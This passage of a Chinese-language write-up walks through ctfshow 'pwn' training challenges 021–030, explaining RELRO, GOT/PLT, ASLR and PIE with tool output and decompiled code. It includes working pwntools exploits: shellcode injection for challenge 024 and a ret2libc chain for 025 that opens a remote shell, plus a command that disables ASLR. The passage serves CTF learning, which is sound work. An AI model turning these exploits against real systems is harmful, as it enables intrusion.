[13] .text             PROGBITS         0000000000400490  00000490<br>
0000000000000252  0000000000000000  AX       0     0     16<br>
[14] .fini             PROGBITS         00000000004006e4  000006e4<br>
0000000000000009  0000000000000000  AX       0     0     4<br>
[15] .rodata           PROGBITS         00000000004006f0  000006f0<br>
000000000000053a  0000000000000000   A       0     0     8<br>
[16] .eh_frame_hdr     PROGBITS         0000000000400c2c  00000c2c<br>
000000000000003c  0000000000000000   A       0     0     4<br>
[17] .eh_frame         PROGBITS         0000000000400c68  00000c68<br>
0000000000000100  0000000000000000   A       0     0     8<br>
[18] .init_array       INIT_ARRAY       0000000000600e10  00000e10<br>
0000000000000008  0000000000000008  WA       0     0     8<br>
[19] .fini_array       FINI_ARRAY       0000000000600e18  00000e18<br>
0000000000000008  0000000000000008  WA       0     0     8<br>
[20] .dynamic          DYNAMIC          0000000000600e20  00000e20<br>
00000000000001d0  0000000000000010  WA       6     0     8<br>
[21] .got              PROGBITS         0000000000600ff0  00000ff0<br>
0000000000000010  0000000000000008  WA       0     0     8<br>
[22] .got.plt          PROGBITS         0000000000601000  00001000<br>
0000000000000030  0000000000000008  WA       0     0     8<br>
[23] .data             PROGBITS         0000000000601030  00001030<br>
0000000000000010  0000000000000000  WA       0     0     8<br>
[24] .bss              NOBITS           0000000000601040  00001040<br>
0000000000000008  0000000000000000  WA       0     0     1<br>
[25] .comment          PROGBITS         0000000000000000  00001040<br>
0000000000000029  0000000000000001  MS       0     0     1<br>
[26] .symtab           SYMTAB           0000000000000000  00001070<br>
00000000000005e8  0000000000000018          27    43     8<br>
[27] .strtab           STRTAB           0000000000000000  00001658<br>
00000000000001f1  0000000000000000           0     0     1<br>
[28] .shstrtab         STRTAB           0000000000000000  00001849<br>
0000000000000103  0000000000000000           0     0     1<br>
Key to Flags:<br>
W (write), A (alloc), X (execute), M (merge), S (strings), I (info),<br>
L (link order), O (extra OS processing required), G (group), T (TLS),<br>
C (compressed), x (unknown), o (OS specific), E (exclude),<br>
l (large), p (processor specific)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<p>[21] .got       PROGBITS     0000000000600ff0  00000ff0<br>
0000000000000010  0000000000000008  WA    0   0   8<br>
[22] .got.plt      PROGBITS     0000000000601000  00001000<br>
0000000000000030  0000000000000008  WA  0   0     8</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 程序头多了GNU_RELRO，将.dynamic 、.got标记为只读权限（R），那么在重定向完成后，动态链接器就会将这个区域保护起来</span><br><span class="line">- 写.got表的时候就会抛出异常，而写.got.plt依旧正常</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>./pwn 600ff0<br>
Segmentation fault</p>
<p>ctfshow@ubuntu:~/Desktop/ctfshow-pwn-primary/pwn021$ ./pwn 601000<br>
RELRO: 52454c52</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- ctfshow&#123;0_1_0x600ff0_0x601000&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 022  .got和.got.plt表</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>checksec pwn<br>
[*] ‘/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn022/pwn’<br>
Arch:     amd64-64-little<br>
RELRO:    Full RELRO<br>
Stack:    No canary found<br>
NX:       NX enabled<br>
PIE:      No PIE (0x400000)<br>
64位  完全开启了RELRO保护</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<p>readelf -S pwn<br>
There are 28 section headers, starting at offset 0x1900:</p>
<p>Section Headers:<br>
[Nr] Name              Type             Address           Offset<br>
Size              EntSize          Flags  Link  Info  Align<br>
[ 0]                   NULL             0000000000000000  00000000<br>
0000000000000000  0000000000000000           0     0     0<br>
[ 1] .interp           PROGBITS         0000000000400238  00000238<br>
000000000000001c  0000000000000000   A       0     0     1<br>
[ 2] .note.ABI-tag     NOTE             0000000000400254  00000254<br>
0000000000000020  0000000000000000   A       0     0     4<br>
[ 3] .note.gnu.build-i NOTE             0000000000400274  00000274<br>
0000000000000024  0000000000000000   A       0     0     4<br>
[ 4] .gnu.hash         GNU_HASH         0000000000400298  00000298<br>
000000000000001c  0000000000000000   A       5     0     8<br>
[ 5] .dynsym           DYNSYM           00000000004002b8  000002b8<br>
0000000000000090  0000000000000018   A       6     1     8<br>
[ 6] .dynstr           STRTAB           0000000000400348  00000348<br>
000000000000004b  0000000000000000   A       0     0     1<br>
[ 7] .gnu.version      VERSYM           0000000000400394  00000394<br>
000000000000000c  0000000000000002   A       5     0     2<br>
[ 8] .gnu.version_r    VERNEED          00000000004003a0  000003a0<br>
0000000000000020  0000000000000000   A       6     1     8<br>
[ 9] .rela.dyn         RELA             00000000004003c0  000003c0<br>
0000000000000030  0000000000000018   A       5     0     8<br>
[10] .rela.plt         RELA             00000000004003f0  000003f0<br>
0000000000000048  0000000000000018  AI       5    21     8<br>
[11] .init             PROGBITS         0000000000400438  00000438<br>
0000000000000017  0000000000000000  AX       0     0     4<br>
[12] .plt              PROGBITS         0000000000400450  00000450<br>
0000000000000040  0000000000000010  AX       0     0     16<br>
[13] .text             PROGBITS         0000000000400490  00000490<br>
0000000000000252  0000000000000000  AX       0     0     16<br>
[14] .fini             PROGBITS         00000000004006e4  000006e4<br>
0000000000000009  0000000000000000  AX       0     0     4<br>
[15] .rodata           PROGBITS         00000000004006f0  000006f0<br>
000000000000053a  0000000000000000   A       0     0     8<br>
[16] .eh_frame_hdr     PROGBITS         0000000000400c2c  00000c2c<br>
000000000000003c  0000000000000000   A       0     0     4<br>
[17] .eh_frame         PROGBITS         0000000000400c68  00000c68<br>
0000000000000100  0000000000000000   A       0     0     8<br>
[18] .init_array       INIT_ARRAY       0000000000600dc0  00000dc0<br>
0000000000000008  0000000000000008  WA       0     0     8<br>
[19] .fini_array       FINI_ARRAY       0000000000600dc8  00000dc8<br>
0000000000000008  0000000000000008  WA       0     0     8<br>
[20] .dynamic          DYNAMIC          0000000000600dd0  00000dd0<br>
00000000000001f0  0000000000000010  WA       6     0     8<br>
[21] .got              PROGBITS         0000000000600fc0  00000fc0<br>
0000000000000040  0000000000000008  WA       0     0     8<br>
[22] .data             PROGBITS         0000000000601000  00001000<br>
0000000000000010  0000000000000000  WA       0     0     8<br>
[23] .bss              NOBITS           0000000000601010  00001010<br>
0000000000000008  0000000000000000  WA       0     0     1<br>
[24] .comment          PROGBITS         0000000000000000  00001010<br>
0000000000000029  0000000000000001  MS       0     0     1<br>
[25] .symtab           SYMTAB           0000000000000000  00001040<br>
00000000000005d0  0000000000000018          26    42     8<br>
[26] .strtab           STRTAB           0000000000000000  00001610<br>
00000000000001f1  0000000000000000           0     0     1<br>
[27] .shstrtab         STRTAB           0000000000000000  00001801<br>
00000000000000fa  0000000000000000           0     0     1<br>
Key to Flags:<br>
W (write), A (alloc), X (execute), M (merge), S (strings), I (info),<br>
L (link order), O (extra OS processing required), G (group), T (TLS),<br>
C (compressed), x (unknown), o (OS specific), E (exclude),<br>
l (large), p (processor specific)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<p>[21] .got      PROGBITS      0000000000600fc0  00000fc0<br>
0000000000000040  0000000000000008  WA    0   0   8</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 没有了.got.plt，且.got也不可写</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>./pwn 600fc0</p>
<p>Segmentation fault  // 抛出了异常</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- ctfshow&#123;0_0_0x600fc0&#125;</span><br><span class="line"></span><br><span class="line">### 023  溢出？</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>checksec pwn<br>
[*] ‘/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn023/pwn’<br>
Arch:     i386-32-little<br>
RELRO:    Partial RELRO<br>
Stack:    No canary found<br>
NX:       NX enabled<br>
PIE:      No PIE (0x8048000)<br>
32位  开启NX保护   部分开启RELRO保护</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">```c</span><br><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  __gid_t v3; // eax</span><br><span class="line">  int v5; // [esp-Ch] [ebp-2Ch]</span><br><span class="line">  int v6; // [esp-8h] [ebp-28h]</span><br><span class="line">  int v7; // [esp-4h] [ebp-24h]</span><br><span class="line">  FILE *stream; // [esp+4h] [ebp-1Ch]</span><br><span class="line"></span><br><span class="line">  stream = fopen(&quot;/ctfshow_flag&quot;, &quot;r&quot;);</span><br><span class="line">  if ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;/ctfshow_flag: No such file or directory.&quot;);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(flag, 64, stream);</span><br><span class="line">  signal(11, (__sighandler_t)sigsegv_handler);  // 注册信号处理器  不懂喵= =</span><br><span class="line">  v3 = getegid();  // 获取当前进程的有效组ID</span><br><span class="line">  setresgid(v3, v3, v3, v5, v6, v7, v3);  // 尝试设置进程的实时组ID  但是不懂= =</span><br><span class="line">    </span><br><span class="line">    // 美术部分</span><br><span class="line">  puts(asc_8048940);</span><br><span class="line">  puts(asc_80489B4);</span><br><span class="line">  puts(asc_8048A30);</span><br><span class="line">  puts(asc_8048ABC);</span><br><span class="line">  puts(asc_8048B4C);</span><br><span class="line">  puts(asc_8048BD0);</span><br><span class="line">  puts(asc_8048C64);</span><br><span class="line">  puts(&quot;    * *************************************                           &quot;);</span><br><span class="line">  puts(aClassifyCtfsho);</span><br><span class="line">  puts(&quot;    * Type  : Linux_Security_Mechanisms                               &quot;);</span><br><span class="line">  puts(&quot;    * Site  : https://ctf.show/                                       &quot;);</span><br><span class="line">  puts(&quot;    * Hint  : No canary found                                         &quot;);</span><br><span class="line">  puts(&quot;    * *************************************                           &quot;);</span><br><span class="line">  puts(&quot;How to input ?&quot;);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">  if ( argc &gt; 1 )  // 检测是否有额外的命令行参数，并将第一个命令行参数作为参数传递给该函数</span><br><span class="line">    ctfshow((char *)argv[1]);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">char *__cdecl ctfshow(char *src)</span><br><span class="line">&#123;</span><br><span class="line">  char dest[58]; // [esp+Ah] [ebp-3Eh] BYREF</span><br><span class="line"></span><br><span class="line">  return strcpy(dest, src);</span><br><span class="line">&#125;</span><br><span class="line">/* 接受一个字符串参数 src ，并使用 strcpy 函数将该字符串复制到名</span><br><span class="line">为 dest 的缓冲区中。然后，它返回指向 dest 缓冲区的指针 */</span><br></pre></td></tr></table></figure>
<ul>
<li>当未开启Canary保护时，输入字符串长度超过了 dest 缓冲区的大小，这可能导致缓冲区溢出漏洞</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./pwn aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">  </span><br><span class="line">flag&#123;just_test_my_process! &#125;</span><br><span class="line">// 本地测试，懒得连远程</span><br></pre></td></tr></table></figure>
<h3 id="024-pwntools-shellcraft"><a class="header-anchor" href="#024-pwntools-shellcraft">¶</a>024  pwntools-shellcraft</h3>
<ul>
<li>hint：可以使用pwntools的shellcraft模块来进行攻击</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">checksec pwn</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn024/pwn&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line">32位  仅开启RELRO保护</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">看汇编</span><br><span class="line">以下是ctfshow函数</span><br><span class="line"></span><br><span class="line">.text:080484C6                 public ctfshow</span><br><span class="line">.text:080484C6 ctfshow         proc near               ; CODE XREF: main+132↓p</span><br><span class="line">.text:080484C6</span><br><span class="line">.text:080484C6 buf             = byte ptr -88h</span><br><span class="line">.text:080484C6 var_4           = dword ptr -4</span><br><span class="line">.text:080484C6</span><br><span class="line">.text:080484C6 ; __unwind &#123;</span><br><span class="line">.text:080484C6                 push    ebp</span><br><span class="line">.text:080484C7                 mov     ebp, esp</span><br><span class="line">.text:080484C9                 push    ebx</span><br><span class="line">.text:080484CA                 sub     esp, 84h</span><br><span class="line">.text:080484D0                 call    __x86_get_pc_thunk_bx</span><br><span class="line">.text:080484D5                 add     ebx, (offset _GLOBAL_OFFSET_TABLE_ - $)</span><br><span class="line">.text:080484DB                 sub     esp, 4</span><br><span class="line">.text:080484DE                 push    100h            ; nbytes</span><br><span class="line">.text:080484E3                 lea     eax, [ebp+buf]</span><br><span class="line">.text:080484E9                 push    eax             ; buf</span><br><span class="line">.text:080484EA                 push    0               ; fd</span><br><span class="line">.text:080484EC                 call    _read</span><br><span class="line">.text:080484F1                 add     esp, 10h</span><br><span class="line">.text:080484F4                 sub     esp, 0Ch</span><br><span class="line">.text:080484F7                 lea     eax, [ebp+buf]</span><br><span class="line">.text:080484FD                 push    eax             ; s</span><br><span class="line">.text:080484FE                 call    _puts</span><br><span class="line">.text:08048503                 add     esp, 10h</span><br><span class="line">.text:08048506                 lea     eax, [ebp+buf]</span><br><span class="line">.text:0804850C                 call    eax</span><br><span class="line">.text:0804850E                 nop</span><br><span class="line">.text:0804850F                 mov     ebx, [ebp+var_4]</span><br><span class="line">.text:08048512                 leave</span><br><span class="line">.text:08048513                 retn</span><br><span class="line">.text:08048513 ; &#125; // starts at 80484C6</span><br><span class="line">.text:08048513 ctfshow         endp</span><br></pre></td></tr></table></figure>
<ol>
<li>
<p>函数开始时进行一些栈操作，保存寄存器的值。</p>
</li>
<li>
<p>调用 __x86_get_pc_thunk_bx 函数，获取当前的指令位置并存储在 ebx 寄存器中。</p>
</li>
<li>
<p>分配 0x84 字节的空间用于缓冲区，存储用户输入的数据。</p>
</li>
<li>
<p>调用 read 函数，从标准输入读取数据，并存储到缓冲区。</p>
</li>
<li>
<p>调用 puts 函数，将缓冲区的内容打印到标准输出。</p>
</li>
<li>
<p>通过调用 call eax 指令，以 eax 寄存器的值作为函数指针，跳转到缓冲区中存储的地址执行。</p>
</li>
<li>
<p>之后是一些清理工作和函数返回的准备操作</p>
</li>
</ol>
<ul>
<li>这题题目提示了可以使用pwntools的shellcraft模块进行攻击</li>
<li>shellcraft 模块是 pwntools 库中的一个子模块，用于生成各种不同体系结构的 Shellcode。</li>
<li>Shellcode 是一段以二进制形式编写的代码，用于利用软件漏洞、执行特定操作或获取系统权限。</li>
<li>shellcraft 模块提供了一系列函数和方法，用于生成特定体系结构下的 Shellcode</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *	 <span class="comment"># 导入 pwntools 库</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span>		 <span class="comment"># 设置日志级别为调试模式</span></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;) 		# 本地连接</span></span><br><span class="line">io = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="number">28119</span>) 	<span class="comment"># 远程连接</span></span><br><span class="line">shellcode = asm(shellcraft.sh()) 		<span class="comment"># 生成一个 Shellcode</span></span><br><span class="line">io.sendline(shellcode)		 <span class="comment"># 将生成的 Shellcode 发送到目标主机</span></span><br><span class="line">io.interactive()		 <span class="comment"># 与目标主机进行交互</span></span><br></pre></td></tr></table></figure>
<h3 id="025-开启NX保护-ret2libc"><a class="header-anchor" href="#025-开启NX保护-ret2libc">¶</a>025 开启NX保护+ret2libc</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">checksec pwn</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn025/pwn&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">32位  开启NX保护  部分开启RELRO保护</span><br></pre></td></tr></table></figure>
<ul>
<li>开启NX保护，部分开启RELRO保护 → <code>具体攻击手法为：ret2libc</code></li>
<li>即先找到<strong>栈溢出</strong>漏洞，通过write函数泄露 write 函数的真实地址，根据<strong>泄露的 write 函数地址</strong>，使用 <strong>LibcSearcher</strong> 来搜索 <strong>libc 库</strong>中相应的函数地址和字符串地址，获取 <strong>system 函数</strong>和**“/bin/sh” 字符串的地址**。构造新的 payload，使用泄露的 system 函数和 “/bin/sh” 字符串的地址来进行<strong>get shell</strong></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  <span class="comment"># 用于漏洞利用</span></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *  <span class="comment"># 用于查找libc版本中的符号地址</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 远程连接</span></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment">#io = remote(&#x27;127.0.0.1&#x27;,10000)</span></span><br><span class="line">io = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="number">28177</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)  <span class="comment"># 创建elf对象</span></span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]  <span class="comment"># 获取main函数地址</span></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]  <span class="comment"># 获取write GOT（全局偏移表）地址</span></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]  <span class="comment"># 获取write PLT（过程链接表）地址</span></span><br><span class="line">payload = cyclic(<span class="number">0x88</span>+<span class="number">0x4</span>) + p32(write_plt) + p32(main) + p32(<span class="number">0</span>) + p32(write_got) + p32(<span class="number">4</span>)  <span class="comment"># 泄漏write函数在libc中的地址。这里使用了cyclic函数生成填充字节，p32函数将地址转换为小端字节序的字节串</span></span><br><span class="line"></span><br><span class="line"> <span class="comment"># 发送payload并接收响应</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">write = u32(io.recv(<span class="number">4</span>)) </span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(write)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用LibcSearcher类查找与泄漏的write函数地址匹配的libc版本</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算libc库的基地址</span></span><br><span class="line">libc_base = write - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取system和/bin/sh地址</span></span><br><span class="line">system = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"><span class="comment"># 使用已知的libc基地址和LibcSearcher类来获取system函数和/bin/sh字符串的地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造一个新的payload，这次是为了调用system函数并传递/bin/sh作为参数</span></span><br><span class="line">payload = cyclic(<span class="number">0x88</span>+<span class="number">0x4</span>) + p32(system) + p32(main) + p32(bin_sh)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送payload并等待响应，然后进入交互模式，允许用户与远程shell进行交互</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="026-ASLR-0"><a class="header-anchor" href="#026-ASLR-0">¶</a>026 ASLR  0</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">checksec pwn</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn026/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">64位 开启NX保护  部分开启RELRO保护  PIE未开启</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>ASLR（Address Space Layout Randomization）是一种操作系统级别的安全保护机制，旨在增加软件系统的安全性。</p>
</li>
<li>
<p>它通过**<u>随机化程序在内存中的布局</u><strong>，使得攻击者难以准确地</strong><u>确定关键代码和数据的位</u>**置，从而增加了利用软件漏洞进行攻击的难度</p>
</li>
<li>
<p>开启不同等级会有不同的效果：</p>
<ol>
<li>
<p>内存布局随机化： ASLR的主要目标是随机化程序的内存布局。在传统的内存布局中，不同的库和模块通常会在固定的内存位置上加载，攻击者可以利用这种可预测性来定位和利用漏洞。ASLR通过随机化这些模块的加载地址，使得攻击者无法准确地确定内存中的关键数据结构和代码的位置。</p>
</li>
<li>
<p>地址空间范围的随机化： ASLR还会随机化进程的地址空间范围。在传统的地址空间中，栈、堆、代码段和数据段通常会被分配到固定的地址范围中。ASLR会随机选择地址空间的起始位置和大小，从而使得这些重要的内存区域在每次运行时都有不同的位置。</p>
</li>
<li>
<p>随机偏移量： ASLR会引入随机偏移量，将程序和模块在内存中的相对位置随机化。这意味着每个模块的实际地址是相对于一个随机基址偏移的，而不是绝对地址。攻击者需要在运行时发现这些偏移量，才能准确地定位和利用漏洞。</p>
</li>
<li>
<p>堆和栈随机化： ASLR也会对堆和栈进行随机化。堆随机化会在每次分配内存时选择不同的起始地址，使得攻击者无法准确地预测堆上对象的位置。栈随机化会随机选择栈帧的起始位置，使得攻击者无法轻易地覆盖返回地址或控制程序流程</p>
</li>
</ol>
</li>
<li>
<p>在Linux中，ALSR的全局配置/proc/sys/kernel/randomize_va_space有三种情况：</p>
<ul>
<li>0表示关闭ALSR</li>
<li>1表示部分开启（将mmap的基址、stack和vdso页面随机化）</li>
<li>2表示完全开启</li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th>alsr</th>
<th>executable</th>
<th>plt</th>
<th>heap</th>
<th>stack</th>
<th>shared libraries</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>x</td>
<td>x</td>
<td>x</td>
<td>x</td>
<td>x</td>
</tr>
<tr>
<td>1</td>
<td>x</td>
<td>x</td>
<td>x</td>
<td>√</td>
<td>√</td>
</tr>
<tr>
<td>2</td>
<td>x</td>
<td>x</td>
<td>√</td>
<td>√</td>
<td>√</td>
</tr>
<tr>
<td>2+PIE</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>√</td>
</tr>
</tbody>
</table>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./pwn</span><br><span class="line"></span><br><span class="line">cat /proc/sys/kernel/randomize_va_space</span><br><span class="line">&gt;&gt;&gt; 2</span><br><span class="line"></span><br><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line"></span><br><span class="line">cat /proc/sys/kernel/randomize_va_space</span><br><span class="line">&gt;&gt;&gt; 0</span><br><span class="line"></span><br><span class="line">./pwn</span><br><span class="line">得到真的flag</span><br></pre></td></tr></table></figure>
<h3 id="027-ASLR-0-1"><a class="header-anchor" href="#027-ASLR-0-1">¶</a>027 ASLR 0/1</h3>
<ul>
<li>详细分析同026</li>
</ul>
<h3 id="028-ASLR-2"><a class="header-anchor" href="#028-ASLR-2">¶</a>028 ASLR 2</h3>
<ul>
<li>此时不管等级为0 1 2 ，函数本身地址不会变化（在未开启PIE的情况下）</li>
<li>详细分析同026</li>
</ul>
<h3 id="029-ASLR和PIE都开启"><a class="header-anchor" href="#029-ASLR和PIE都开启">¶</a>029 ASLR和PIE都开启</h3>
<ul>
<li>ASLR和PIE开启后，地址都会将随机化</li>
<li>这里值得注意的是，由于粒度问题，虽然地址都被随机化了，但是被随机化的都仅仅是某个对象的起始地址，而在其内部还是原来的结构</li>
<li>也就是相对偏移是不会变化的</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./pwn</span><br><span class="line"></span><br><span class="line">    * *************************************                           </span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门                              </span><br><span class="line">    * Type  : Linux_Security_Mechanisms                               </span><br><span class="line">    * Site  : https://ctf.show/                                       </span><br><span class="line">    * Hint  : Please confirm your ASLR level first !                  </span><br><span class="line">    * *************************************                           </span><br><span class="line">sh: 1: cannot create /proc/sys/kernel/randomize_va_space: Permission denied</span><br><span class="line">Here is your ASLR level:</span><br><span class="line">2</span><br><span class="line"></span><br><span class="line">Let&#x27;s take a look at protection:</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn029/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">executable: 0x5585483d383a</span><br><span class="line">system@plt: 0x7f8a6ad62420</span><br><span class="line">heap: 0x558549735260</span><br><span class="line">stack: 0x7ffc4481e7c4</span><br><span class="line"></span><br><span class="line">As you can see, the protection has been fully turned on and the address has been completely randomized!</span><br><span class="line"></span><br><span class="line">Here is your flag:</span><br><span class="line">ctfshow&#123;Address_Space_Layout_Randomization&amp;&amp;Position-Independent_Executable_1s_C0000000000l!&#125;</span><br></pre></td></tr></table></figure>
<h3 id="030-PIE关闭"><a class="header-anchor" href="#030-PIE关闭">¶</a>030 PIE关闭</h3>
<ul>
<li>关闭PIE</li>
<li>程序的基地址固定，攻击者可以更容易地确定内存中函数和变量的位置。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">checksec pwn</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn030/pwn&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">32位  PIE关闭  开启NX  部分开启RELRO保护</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  ctfshow(&amp;argc);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048710);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048784);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048800);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804888C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804891C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489A0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A34);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Linux_Security_Mechanisms                               &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : No Canary found &amp; No PIE &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  write(<span class="number">0</span>, <span class="string">&quot;Hello CTFshow!\n&quot;</span>, <span class="number">0xE</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">132</span>]; <span class="comment">// [esp+0h] [ebp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* buf ，用于存储从标准输入读取的数据。该变量在栈上分配，相对于函数栈帧指针 ebp 的偏移为-0x88 </span></span><br><span class="line"><span class="comment"></span></span><br><span 